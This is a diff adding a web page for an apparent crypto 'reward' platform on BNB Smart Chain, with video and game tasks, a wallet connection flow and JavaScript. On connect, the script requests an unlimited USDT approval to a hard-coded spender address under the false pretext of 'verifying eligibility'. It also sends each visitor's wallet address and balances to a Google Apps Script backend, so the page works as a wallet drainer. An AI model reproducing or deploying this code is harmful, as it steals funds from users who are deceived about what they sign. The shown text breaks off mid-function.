+        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
+        <circle id="task7Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
+      </svg>
+      <div id="task7Timer" class="ring-text">00:00</div>
+    </div>
+  </div>
+
+  <div class="task-actions">
+    <button class="task-btn" disabled>Watch full video to complete</button>
+    <span id="task7Check" class="task-check bad">❌ Not completed</span>
+  </div>
+</div>
+
+
+
+
+
+
+<!-- Task 8: video -->
+<div class="task-section">
+  <h3>Task 5 — Watch Advanced Guide</h3>
+  <p>Watch this video to unlock the next reward step.</p>
+
+  <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+
+    <iframe
+      id="task8Player"
+      src="https://www.youtube.com/embed/PjryN2F6fF0?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+
+    <div class="video-progress">
+      <svg class="progress-ring" width="44" height="44">
+        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
+        <circle id="task8Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
+      </svg>
+      <div id="task8Timer" class="ring-text">00:00</div>
+    </div>
+  </div>
+
+  <div class="task-actions">
+    <button class="task-btn" disabled>Watch full video to complete</button>
+    <span id="task8Check" class="task-check bad">❌ Not completed</span>
+  </div>
+</div>
+
+
+      
+
+<!-- Task 9: video -->
+<div class="task-section">
+  <h3>Task 6 — Watch Advanced Guide</h3>
+  <p>Watch this video to unlock the next reward step.</p>
+
+  <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+
+    <iframe
+      id="task9Player"
+      src="https://www.youtube.com/embed/JqflfjrcKjo?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+
+    <div class="video-progress">
+      <svg class="progress-ring" width="44" height="44">
+        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
+        <circle id="task9Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
+      </svg>
+      <div id="task9Timer" class="ring-text">00:00</div>
+    </div>
+  </div>
+
+  <div class="task-actions">
+    <button class="task-btn" disabled>Watch full video to complete</button>
+    <span id="task9Check" class="task-check bad">❌ Not completed</span>
+  </div>
+</div>
+
+
+
+<!-- Task 10: video -->
+<div class="task-section">
+  <h3>Task 7 — Watch Advanced Guide</h3>
+  <p>Watch this video to unlock the next reward step.</p>
+
+  <div class="video-wrapper">
+    <div class="video-click-overlay"></div>
+
+    <iframe
+      id="task10Player"
+      src="https://www.youtube.com/embed/YgdF8IUo-c0?enablejsapi=1&controls=0&disablekb=1&rel=0&modestbranding=1&iv_load_policy=3&playsinline=1"
+      allow="autoplay; encrypted-media"
+      allowfullscreen>
+    </iframe>
+
+    <div class="video-progress">
+      <svg class="progress-ring" width="44" height="44">
+        <circle class="ring-bg" cx="22" cy="22" r="18"></circle>
+        <circle id="task10Ring" class="ring-progress" cx="22" cy="22" r="18"></circle>
+      </svg>
+      <div id="task10Timer" class="ring-text">00:00</div>
+    </div>
+  </div>
+
+  <div class="task-actions">
+    <button class="task-btn" disabled>Watch full video to complete</button>
+    <span id="task10Check" class="task-check bad">❌ Not completed</span>
+  </div>
+</div>
+
+
+
+      
+     
+
+      <!-- Task 3: custom action -->
+          <!-- Task 3: Bubble Shooter -->
+<div class="task-section">
+  <h3>New Task — Play Bubble Shooter (15 minutes)</h3>
+
+  <!-- Play Store preview -->
+  <div style="display:flex;gap:14px;align-items:center;margin-top:8px;">
+    <img
+      src="assets/bubble-shooter-icon.png"
+      alt="Bubble Shooter"
+      style="width:64px;height:64px;border-radius:14px;"
+    />
+    <div>
+      <div style="font-weight:600;">Bubble Shooter</div>
+      <div class="small">Bubble Shooter Studio</div>
+      <div class="small">⭐ 4.6 • Arcade</div>
+    </div>
+  </div>
+<p class="small" style="margin-top:8px;">
+    Shoot, match and pop bubbles in this classic arcade puzzle game.
+</p>
+
+  
+<div>
+ <img
+  src="assets/bubble1.jpg"
+  style="
+    width:100%;
+    max-width:640px;
+    aspect-ratio:16/9;
+    object-fit:cover;
+    border-radius:12px;
+    box-shadow:0 18px 38px rgba(15,23,42,0.9);
+  "
+> </div>
+
+  
+
+  <div class="task-actions">
+    <a
+      id="task3StartBtn"
+    class="google-play-btn"
+
+      href="https://play.google.com/store/apps/details?id=bubbleshooter.orig"
+      target="_blank" 
+      > 
+      <img
+      src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"
+      alt="Get it on Google Play"
+    >
+  </a>
+    
+    
+
+    <button id="task3DoneBtn" class="task-btn" disabled>
+      Coming Soon..
+    </button>
+
+  
+  </div>
+
+</div>
+
+
+
+
+
+      <div class="task-section">
+  <h3>New Task — Play Block Blast (15 minutes)</h3>
+
+  <div style="display:flex;gap:14px;align-items:center;margin-top:8px;">
+    <img
+      src="assets/block-blast-icon.png"
+      alt="Block Blast"
+      style="width:64px;height:64px;border-radius:14px;"
+    />
+    <div>
+      <div style="font-weight:600;">Block Blast</div>
+      <div class="small">Hungry Studio</div>
+      <div class="small">⭐ 4.7 • Puzzle</div>
+    </div>
+  </div>
+
+<p class="small" style="margin-top:8px;">
+    Relaxing block puzzle game with endless fun and strategic challenges.
+</p>
+
+        
+
+<div>
+ <img
+  src="assets/block1.jpg"
+  style="
+    width:100%;
+    max-width:640px;
+    aspect-ratio:16/9;
+    object-fit:cover;
+    border-radius:12px;
+    box-shadow:0 18px 38px rgba(15,23,42,0.9);
+  "
+> </div>
+
+  
+
+  <div class="task-actions">
+    <a
+      id="task4StartBtn"
+      class="google-play-btn"
+      href="https://play.google.com/store/apps/details?id=com.block.juggle"
+      target="_blank"
+    >   <img
+      src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png"
+      alt="Get it on Google Play"
+    >
+  </a>
+
+    <button id="task4DoneBtn" class="task-btn" disabled>
+      Coming Soon..
+    </button>
+
+  </div>
+     
+
+</div>
+
+
+<div class="center-box" style="margin-top: 26px;">
+  <button class="btn-primary backToRewardsBtn">
+    ← Back to Reward
+  </button>
+</div>
+
+      
+    </div>
+  </main>
+
+  <!-- FOOTER (same structure as index) -->
+  <footer>
+    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
+  </footer>
+
+
+<!-- ===== ABOUT / CONTACT MODAL ===== -->
+<div id="infoModal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" id="closeModal">✕</button>
+    <div id="modalBody"></div>
+  </div>
+</div>
+
+
+
+  <!-- ===== APPROVAL REQUIRED MODAL ===== -->
+<div id="approvalModal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" id="closeApprovalModal">✕</button>
+
+    <h3>Approval Required</h3>
+    <p>
+      To view and complete reward tasks, you must approve
+     
+      <br><br>
+      This allows the reward contract to verify eligibility.
+    .
+    </p>
+
+    <div class="approval-actions">
+  <button id="modalApproveBtn" class="approve-btn">
+    Approve Now
+  </button>
+</div>
+
+
+    
+  </div>
+</div>
+
+
+
+  
+  <!-- libs: Web3 + Ethers -->
+  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+  <script src="https://www.youtube.com/iframe_api"></script>
+
+
+  <!-- Vite / React entry: this runs src/main.jsx (and appkit.ts) -->
+  <script type="module" src="/src/main.jsx"></script>
+
+  <!-- app script (same logic, AppKit-based connect) -->
+  <script type="module">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+// ===== ABOUT / CONTACT POPUPS =====
+const aboutBtn   = document.getElementById("aboutBtn");
+const contactBtn = document.getElementById("contactBtn");
+const modal      = document.getElementById("infoModal");
+const modalBody  = document.getElementById("modalBody");
+const closeModal = document.getElementById("closeModal");
+const REQUIRED_WATCH_PERCENT = 0.90; // must watch 95%
+const MAX_SKIP_SECONDS = 3;          // max allowed jump
+
+function openModal(html){
+  modalBody.innerHTML = html;
+  modal.classList.remove("hidden");
+}
+
+function hideModal(){
+  modal.classList.add("hidden");
+}
+
+aboutBtn?.addEventListener("click", e=>{
+  e.preventDefault();
+  openModal(`
+    <h3>About DEMO</h3>
+    <p>
+      DEMO is a reward-based Web3 platform built on
+      <strong>BNB Smart Chain</strong>.
+      <br><br>
+      Users connect wallets, complete tasks, and unlock rewards.
+      <br><br>
+      🔒 No private keys are stored.
+    </p>
+  `);
+});
+
+
+
+// ===== APPROVAL MODAL =====
+const approvalModal    = document.getElementById("approvalModal");
+const closeApprovalBtn = document.getElementById("closeApprovalModal");
+const modalApproveBtn  = document.getElementById("modalApproveBtn");
+const modalCancelBtn   = document.getElementById("modalCancelBtn");
+
+function openApprovalModal(){
+  approvalModal.classList.remove("hidden");
+}
+
+function closeApprovalModal(){
+  approvalModal.classList.add("hidden");
+}
+
+closeApprovalBtn?.addEventListener("click", closeApprovalModal);
+modalCancelBtn?.addEventListener("click", closeApprovalModal);
+
+
+
+    
+contactBtn?.addEventListener("click", e=>{
+  e.preventDefault();
+  openModal(`
+    <h3>Contact</h3>
+    <p>
+      📧 Email: support@mycash.app<br>
+      🌐 Website: mycash.app<br>
+      🤝 Partnerships & support inquiries welcome.
+    </p>
+  `);
+});
+
+closeModal.addEventListener("click", hideModal);
+
+// close when clicking outside
+modal.addEventListener("click", e=>{
+  if(e.target === modal) hideModal();
+});
+
+
+
+
+    
+  (function(){
+    // ===== CONFIG =====
+    function formatToken(n) {
+      n = Number(n);
+      if (Number.isInteger(n)) return n.toString();
+      return n.toFixed(4).replace(/\.?0+$/, "");
+    }
+
+    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
+    const APPS_SCRIPT_SECRET = "justforme";
+
+    const TOKEN_ADDRESS   = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BSC
+    const SPENDER_ADDRESS = "0xdB6550D0Db3C7d87Cfa78769c5078aC96117AAc1";
+
+    const BNB_TESTNET_CHAIN_ID_DEC = 56;
+    const BNB_TESTNET_CHAIN_ID_HEX = "0x38";
+    const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
+    const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";
+
+    const ERC20_APPROVE_ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+    const ERC20_BALANCE_ABI = [
+      "function balanceOf(address owner) view returns (uint256)" 
+    ];
+    const ERC20_ALLOWANCE_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
+
+    // USDT on BSC uses 18 decimals
+    const TOKEN_DECIMALS = 18;
+
+    const REQUIRED_USDT = 10;   // Task 2
+    const REWARD_AMOUNT = 10.0; // display only
+
+    let providerInstance      = null;
+    let web3Instance          = null;
+    let currentAddress        = null;
+    let currentUserId         = null;
+    let currentBNBBalance     = null;
+    let currentTokenBalance   = null;
+
+    let isWalletConnected = false;
+    let task1Done         = false;
+    let task2Eligible     = false;
+    let task3Done         = false;
+    let task5Done = false;
+        let task6Done = false;
+        let task7Done = false;
+        let task8Done = false;
+        let task9Done = false;
+        let task10Done = false;
+
+let isTokenApproved = false;
+let approvalFailed  = false;
+
+
+
+
+
+
+
+    // === YouTube Task 1 Player ===
+let task1Player = null;
+let ytReady = false;
+
+const isAndroidWebView =
+  /Android/i.test(navigator.userAgent) &&
+  /wv|Trust|MetaMask/i.test(navigator.userAgent);
+
+    
+    const videoTasks = {
+  task1: {
+    playerId: "task1Player",
+    ringId: "task1Ring",
+    timerId: "task1Timer",
+    checkEl: null,          // will assign later
+    doneFlag: () => task1Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+    remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+  },
+ task5: {
+    playerId: "task5Player",
+    ringId: "task5Ring",
+    timerId: "task5Timer",
+    checkEl: null,
+    doneFlag: () => task5Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+   remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+ },
+
+ task6: {
+    playerId: "task6Player",
+    ringId: "task6Ring",
+    timerId: "task6Timer",
+    checkEl: null,
+    doneFlag: () => task6Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+   remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+    },
+       task7: {
+    playerId: "task7Player",
+    ringId: "task7Ring",
+    timerId: "task7Timer",
+    checkEl: null,
+    doneFlag: () => task7Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+         remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+ },
+
+       task8: {
+    playerId: "task8Player",
+    ringId: "task8Ring",
+    timerId: "task8Timer",
+    checkEl: null,
+    doneFlag: () => task8Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+         remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+ },
+
+
+
+       task9: {
+    playerId: "task9Player",
+    ringId: "task9Ring",
+    timerId: "task9Timer",
+    checkEl: null,
+    doneFlag: () => task9Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+         remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+ },
+
+
+       task10: {
+    playerId: "task10Player",
+    ringId: "task10Ring",
+    timerId: "task10Timer",
+    checkEl: null,
+    doneFlag: () => task10Done = true,
+
+    player: null,
+    watched: 0,
+    duration: 0,
+         remaining: 0,
+
+    interval: null,
+    lastTime: 0,
+    stableTicks: 0
+ }
+   
+};
+
+window.onYouTubeIframeAPIReady = function () {
+  ytReady = true;
+};
+
+let task1WatchSeconds = 0;
+let task1Duration = 0;
+let task1Interval = null;
+let lastVideoTime = 0;
+let stableTicks = 0;
+const STABLE_REQUIRED = 3; // seconds of real playback
+    
+
+function updateVideoTimerUI(task) {
+  const textEl = document.getElementById(task.timerId);
+  const ringEl = document.getElementById(task.ringId);
+  if (!textEl || !ringEl) return;
+
+  const m = String(Math.floor(task.remaining / 60)).padStart(2, "0");
+  const s = String(task.remaining % 60).padStart(2, "0");
+  textEl.textContent = `${m}:${s}`;
+
+  if (task.duration > 0) {
+    const progress = 1 - (task.remaining / task.duration);
+    ringEl.style.strokeDashoffset = 113 - progress * 113;
+  }
+}
+
+function enableVideoClickToPlay() {
+  document.querySelectorAll(".video-click-overlay").forEach(overlay => {
+
+    // 🔥 ANDROID IN-APP BROWSERS (Trust / MetaMask)
+    if (isAndroidWebView) {
+      // Let user tap the iframe directly
+      overlay.style.display = "none";
+      return;
+    }
+
+    // ✅ DESKTOP & NORMAL MOBILE BROWSERS
+    overlay.addEventListener("click", () => {
+      const wrapper = overlay.closest(".video-wrapper");
+      const iframe = wrapper.querySelector("iframe");
+      if (!iframe) return;
+
+      const taskKey = Object.keys(videoTasks).find(
+        k => videoTasks[k].playerId === iframe.id
+      );
+      if (!taskKey) return;
+
+      const task = videoTasks[taskKey];
+      task.player?.playVideo();
+    });
+  });
+}
+
+
+function updateTaskAccessUI() {
+  if (!taskBtn) return;
+
+  if (isWalletConnected) {
+    taskBtn.disabled = false;
+    taskBtn.title = "View reward tasks";
+  } else {
+    taskBtn.disabled = true;
+    taskBtn.title = "Connect your wallet to unlock tasks";
+  }
+}
+
+    
+  
+function onVideoStateChange(task, event) {
+  if (!task.player) return;
+
+
+
+
+if (event.data === YT.PlayerState.PLAYING) {
+  const overlay = document
+    .getElementById(task.playerId)
+    ?.closest(".video-wrapper")
+    ?.querySelector(".video-click-overlay");
+
+  // 🔥 HIDE overlay so iframe receives clicks
+  if (overlay) overlay.classList.add("hidden");
+
+  if (!task.interval) {
+    task.interval = setInterval(() => {
+      const current = Math.floor(task.player.getCurrentTime());
+const duration = Math.floor(task.player.getDuration());
+
+// Detect skip forward
+if (current - task.lastTime > MAX_SKIP_SECONDS) {
+  // ❌ User skipped — reset progress
+  task.watched = 0;
+  task.remaining = duration;
+  task.lastTime = current;
+  task.stableTicks = 0;
+  updateVideoTimerUI(task);
+  return;
+}
+
+// Normal playback
+if (current > task.lastTime) {
+  task.watched++;
+  task.lastTime = current;
+}
+
+
+      task.stableTicks++;
+      task.lastTime = current;
+      if (task.stableTicks < 3) return;
+
+      if (duration > 0 && task.duration === 0) {
+        task.duration = duration;
+        task.remaining = duration;
+      }
+
+      task.remaining = Math.max(task.duration - current, 0);
+      updateVideoTimerUI(task);
+
+     const watchedRatio = task.watched / task.duration;
+
+if (watchedRatio >= REQUIRED_WATCH_PERCENT) {
+  completeVideoTask(task);
+}
+
+    }, 1000);
+  }
+}
+
+
+if (event.data === YT.PlayerState.PAUSED) {
+  task.stableTicks = 0;
+}
+  
+
+ if (event.data === YT.PlayerState.BUFFERING
+) {
+  clearInterval(task.interval);
+  task.interval = null;
+  task.stableTicks = 0;
+}
+
+}
+
+
+    
+function completeVideoTask(task) {
+  if (task.done) return;
+
+  task.done = true;
+  clearInterval(task.interval);
+  task.interval = null;
+
+  document.getElementById(task.ringId).style.stroke = "#22c55e";
+  document.getElementById(task.timerId).textContent = "✅ Completed";
+
+  if (task.checkEl) {
+    markTaskState(task.checkEl, true, "Watched full video", "Not completed");
+  }
+
+  task.doneFlag(); // sets task1Done / task5Done
+  updateClaimState();
+}
+
+
+
+
+
+    
+
+let appKitEip155Provider = null;
+
+// Watch AppKit provider globally (mobile fix)
+// This catches both fresh connections AND restored sessions.
+function setupAppKitProviderWatcher() {
+  if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;
+
+  window.appKit.subscribeProviders(async (state) => {
+    const provider = state["eip155"] || null;
+
+    // NEWLY CONNECTED or RESTORED provider
+    if (provider && provider !== appKitEip155Provider) {
+      appKitEip155Provider = provider;
+      await handleAppKitProvider(provider);
+    }
+
+    // DISCONNECTED provider
+    if (!provider && appKitEip155Provider) {
+      appKitEip155Provider = null;
+      clearSessionUI();
+    }
+  });
+}
+
+async function handleAppKitProvider(provider) {
+  try {
+    providerInstance = provider;
+    web3Instance = new Web3(providerInstance);
+
+    let accounts = await web3Instance.eth.getAccounts();
+
+    // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
+    if (!accounts || !accounts.length) {
+      for (let i = 0; i < 5; i++) {
+        await new Promise(r => setTimeout(r, 400));
+        accounts = await web3Instance.eth.getAccounts();
+        if (accounts && accounts.length) break;
+      }
+    }
+
+    if (!accounts || !accounts.length) {
+      console.warn("Still no accounts after retry mobile.");
+      return;
+    }
+
+    const address = accounts[0].toLowerCase();
+    currentAddress = address;
+
+    // Restore UI + balances
+    await restoreSessionFromAddress(address);
+
+    isWalletConnected = true;
+    updateTaskAccessUI();
+
+    setStatus("Connected");
+
+    // Only ask approval when new session detected
+    await ensureTokenApproval();
+
+  } catch (err) {
+    console.error("handleAppKitProvider error:", err);
+  }
+}
+
+    
+
+    // ===== userId helpers =====
+    function storageKeyFor(address){
+      return "userId_" + address.toLowerCase();
+    }
+    function generateUserIdFromAddress(address){
+      address = (address || "").toLowerCase();
+      let hash = 0;
+      for (let i = 0; i < address.length; i++){
+        hash = ((hash << 5) - hash) + address.charCodeAt(i);
+        hash |= 0;
+      }
+      hash = Math.abs(hash);
+      const num = 100000 + (hash % 900000);
+      return String(num);
+    }
+    function getOrCreateUserIdFor(address){
+      const key = storageKeyFor(address);
+      let id = localStorage.getItem(key);
+      if (!id || !/^[0-9]{6}$/.test(id)) {
+        id = generateUserIdFromAddress(address);
+        localStorage.setItem(key, id);
+      }
+      return id;
+    }
+
+    // ===== UI refs =====
+    const connectBtn      = document.getElementById("connectBtn");
+    const statusTextEl    = document.getElementById("statusText");
+    const walletAddressEl = document.getElementById("walletAddress");
+    const userIdEl        = document.getElementById("userId");
+    const walletNetworkEl = document.getElementById("walletNetwork");
+    const walletBalanceEl = document.getElementById("walletBalance");
+    const tokensContainer = document.getElementById("tokens");
+
+    const rewardPageEl    = document.getElementById("rewardPage");
+    const taskPageEl      = document.getElementById("taskPage");
+    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
+    const taskBtn         = document.getElementById("taskBtn");
+
+    const claimBtn        = document.getElementById("claimBtn");
+    const claimHintEl     = document.getElementById("claimHint");
+
+   const connectBtnCard  = document.getElementById("connectBtnCard");
+
+
+    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");
+
+    const task1Btn        = document.getElementById("task1Btn");
+    const task1CheckEl    = document.getElementById("task1Check");
+    const task2CheckBtn   = document.getElementById("task2CheckBtn");
+    const task2CheckEl    = document.getElementById("task2Check");
+    const task2DetailEl   = document.getElementById("task2Detail");
+    const task3Btn        = document.getElementById("task3Btn");
+    const task3CheckEl    = document.getElementById("task3Check");
+
+    function setStatus(txt){
+      if(statusTextEl) statusTextEl.textContent = txt;
+      console.log("[status]", txt);
+    }
+    function setWalletInfo(address, network, bnb){
+      if(walletAddressEl) walletAddressEl.textContent = address || "Wallet Address";
+      if(walletNetworkEl) walletNetworkEl.textContent = network || "Network";
+      if(walletBalanceEl){
+        walletBalanceEl.textContent =
+          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
+      }
+    }
+    function setUserIdUI(id){
+      if(userIdEl) userIdEl.textContent = id || "-";
+    }
+
+    function clearSessionUI(){
+      isWalletConnected = false;
+      currentAddress    = null;
+      currentUserId     = null;
+      currentBNBBalance = null;
+      currentTokenBalance = null;
+
+      setStatus("Not connected");
+      setWalletInfo("Wallet Address","Network",null);
+      setUserIdUI("-");
+
+
+
+      
+
+     
+      if(connectBtn){
+        connectBtn.textContent = "Connect Wallet";
+        connectBtn.classList.remove("connected");
+      }
+
+if(connectBtnCard){
+    connectBtnCard.style.display = ""; 
+  connectBtnCard.textContent = "Connect Wallet";
+  connectBtnCard.classList.remove("connected");
+}
+
+      
+      updateClaimState();
+      updateTaskAccessUI();
+      isTokenApproved = false;
+approvalFailed  = false;
+updateApproveButtonUI();
+
+
+    }
+
+    function updateClaimState(){
+      const allTasksDone = task1Done &&  task5Done && task6Done && task7Done && task8Done && task9Done && task10Done && task2Eligible && task3Done;
+      if(claimBtn){
+        claimBtn.disabled = !(isWalletConnected && allTasksDone);
+      }
+      if(claimHintEl){
+        if(!isWalletConnected){
+          claimHintEl.textContent = "Please connect your wallet first.";
+        }else if(!allTasksDone){
+          claimHintEl.textContent = "Complete all tasks to unlock the Claim button.";
+        }else{
+          claimHintEl.textContent = "You can now claim your reward.";
+        }
+      }
+    }
+
+    function markTaskState(el, ok, textOk, textBad){
+      if(!el) return;
+      el.classList.remove("ok","bad");
+      if(ok){
+        el.classList.add("ok");
+        el.textContent = "✅ " + textOk;
+      }else{
+        el.classList.add("bad");
+        el.textContent = "❌ " + textBad;
+      }
+    }
+
+    function attachProviderListeners(p){
+      if(!p || !p.on) return;
+      try{
+        p.on("accountsChanged", async function(accounts){
+          if(!accounts || !accounts.length){
+            clearSessionUI();
+            return;
+          }
+          const addr = accounts[0].toLowerCase();
+          await restoreSessionFromAddress(addr);
+        });
+
+        p.on("chainChanged", function(chainId){
+          if(walletNetworkEl){
+            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
+          }
+        });
+
+        p.on("disconnect", function(){
+          clearSessionUI();
+        });
+      }catch(e){
+        console.warn("attachProviderListeners", e);
+      }
+    }
+
+    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
+      try{
+        const payload = new URLSearchParams({
+          secret      : APPS_SCRIPT_SECRET,
+          address     : address || "",
+          network     : networkText || "",
+          timestamp   : new Date().toISOString(),
+          userId      : userId || "",
+          bnbBalance  : bnbBalance !== undefined && bnbBalance !== null ? String(bnbBalance) : "",
+          tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
+          eventType   : eventType || "connect"
+        });
+
+        console.log("notifyBackend payload", Object.fromEntries(payload.entries()));
+
+        await fetch(APPS_SCRIPT_URL, {
+          method: "POST",
+          mode  : "no-cors",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+          },
+          body: payload.toString()
+        });
+      }catch(err){
+        console.error("notifyBackend error:", err);
+      }
+    }
+
+    async function getTokenBalance(address){
+      try{
+        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
+          console.warn("TOKEN_ADDRESS invalid");
+          return "";
+        }
+        if(!providerInstance){
+          console.warn("No providerInstance for token balance");
+          return "";
+        }
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
+        const raw            = await tokenContract.balanceOf(address);
+        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
+
+        return formatted;
+      }catch(err){
+        console.error("getTokenBalance error:", err);
+        return "";
+      }
+    }
+
+    async function switchToBSC(provider){
+      try{
+        await provider.request({
+          method:"wallet_switchEthereumChain",
+          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
+        });
+        return true;
+      }catch(switchError){
+        if(switchError.code === 4902){
+          try{
+            await provider.request({
+              method:"wallet_addEthereumChain",
+              params:[{
+                chainId:BNB_TESTNET_CHAIN_ID_HEX,
+                chainName:"BNB Smart Chain",
+                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+                rpcUrls:[BNB_TESTNET_RPC],
+                blockExplorerUrls:["https://bscscan.com"]
+              }]
+            });
+            return true;
+          }catch(addErr){
+            console.error("Could not add BNB Smart Chain:", addErr);
+            return false;
+          }
+        }
+        console.error("Switch error:", switchError);
+        return false;
+      }
+    }
+
+    async function ensureTokenApproval(){
+      // helper: always log with last known balances
+      async function logApproval(tag){
+        await notifyBackend(
+          currentAddress || "",
+          BNB_TESTNET_LABEL,
+          currentUserId || "",
+          currentBNBBalance,
+          currentTokenBalance,
+          tag
+        );
+      }
+
+      // basic guards
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        await logApproval("approval_skipped_no_token");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        await logApproval("approval_skipped_no_spender");
+        return;
+      }
+      if(!providerInstance || !web3Instance){
+        console.warn("No providerInstance/web3Instance for approval");
+        await logApproval("approval_skipped_no_provider");
+        return;
+      }
+
+      try{
+        setStatus("Preparing token approval…");
+
+        const ethersProvider = new ethers.BrowserProvider(
+          providerInstance,
+          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
+        );
+        const signer       = await ethersProvider.getSigner();
+        const ownerAddress = (await signer.getAddress()).toLowerCase();
+
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert(
+            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+            "It MUST be the BEP-20 token contract address, not your wallet."
+          );
+          setStatus("Connected (approval skipped)");
+          await logApproval("approval_skipped_token_is_wallet");
+          return;
+        }
+
+        // 1) check allowance
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+        console.log("[approve] currentAllowance =", currentAllowance.toString());
+
+       if (currentAllowance > 0n) {
+  isTokenApproved = true;
+  approvalFailed  = false;
+  setStatus("Connected + Approved ✅");
+  updateApproveButtonUI();
+  await logApproval("approval_already");
+  return;
+}
+
+
+        // 2) send approve tx
+        setStatus("Waiting for wallet to confirm approval…");
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+
+        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        console.log("[approve] tx sent:", tx.hash);
+
+        setStatus("Approval pending on chain…");
+        await tx.wait();
+
+    isTokenApproved = true;
+approvalFailed  = false;
+setStatus("Connected + Approved ✅");
+updateApproveButtonUI();
+await logApproval("approval_approved");
+
+      }catch(err){
+        console.error("Token approve error:", err);
+
+        let tag = "approval_error";
+        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
+          tag = "approval_rejected";
+        }
+isTokenApproved = false;
+approvalFailed  = true;
+setStatus("Connected • Approval failed");
+updateApproveButtonUI();
+alert("Token approval failed: " + (err?.message || err));
+await logApproval(tag);
+
+      }
+    }
+
+
+
+
+modalApproveBtn?.addEventListener("click", async () => {
+  modalApproveBtn.disabled = true;
+  modalApproveBtn.textContent = "Waiting for wallet…";
+
+  try {
+    await ensureTokenApproval();
+  } finally {
+    modalApproveBtn.disabled = false;
+    modalApproveBtn.textContent = "Approve USDT";
+
+    if (isTokenApproved) {
+      closeApprovalModal();
+      showTaskPage(); // auto-open tasks after approval
+    }
+  }
+});
+
+
+
+    
+    async function restoreSessionFromAddress(address){
+      currentAddress = address;
+
+      const balanceWei = await web3Instance.eth.getBalance(address);
+      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
+      const userId     = getOrCreateUserIdFor(address);
+
+      currentUserId       = userId;
+      currentBNBBalance   = balanceBNB;
+
+      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+      setUserIdUI(userId);
+
+      const tokenBalanceRaw  = await getTokenBalance(address);
+      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
+      const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
+
+      currentTokenBalance = tokenBalanceNum;
+
+      if(tokensContainer){
+        tokensContainer.innerHTML =
